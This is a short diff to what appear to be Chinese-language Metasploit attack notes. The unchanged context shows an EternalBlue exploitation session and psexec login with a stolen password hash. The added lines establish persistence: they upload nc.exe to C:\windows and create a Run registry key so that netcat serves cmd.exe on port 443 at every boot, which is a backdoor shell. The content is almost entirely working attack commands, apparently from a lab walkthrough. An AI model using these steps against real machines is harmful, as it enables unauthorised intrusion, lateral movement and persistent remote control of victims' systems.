@@ -106,7 +106,7 @@ meterpreter > background
 msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
 
 
-psexec模块，使用此扩大战果；用用户名和密码哈希值登录靶机
+psexec模块，使用此扩大战果；用用户名和密码哈希值登录靶机；
 msf6 exploit(windows/smb/ms17_010_eternalblue) > 
 
 msf6 exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/psexec 
@@ -120,6 +120,13 @@ msf6 exploit(windows/smb/psexec) > set SMBDomain WORKGROUP
 msf6 exploit(windows/smb/psexec) > set SMBUser laohe
 msf6 exploit(windows/smb/psexec) > run
 有时一次不成功
+
+持久生效，使用Linux自带的nc工具，上传到靶机
+把nc.exe上传靶机，并开机启动
+meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows
+meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\nc.exe -Ldp 443 -e cmd.exe'
+
+
 
 
 
